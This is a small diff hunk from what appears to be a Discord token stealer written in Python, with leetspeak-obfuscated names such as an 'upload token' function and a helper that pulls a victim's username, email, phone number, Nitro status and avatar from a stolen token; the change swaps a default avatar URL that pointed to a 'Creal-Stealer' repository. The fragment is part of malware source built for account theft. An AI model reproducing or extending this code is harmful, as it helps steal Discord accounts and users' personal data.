@@ -361,7 +361,7 @@ def upl05dT4k31(t0k3n, path):
     us3rn4m1, hashtag, em31l, idd, pfp, flags, n1tr0, ph0n3 = G3tT0k4n1nf9(t0k3n)
 
     if pfp == None: 
-        pfp = "https://raw.githubusercontent.com/Ayhuuu/Creal-Stealer/main/img/xd.jpg"
+        pfp = "https://imgur.com/pbkXJZh.png"
     else:
         pfp = f"https://cdn.discordapp.com/avatars/{idd}/{pfp}"
 
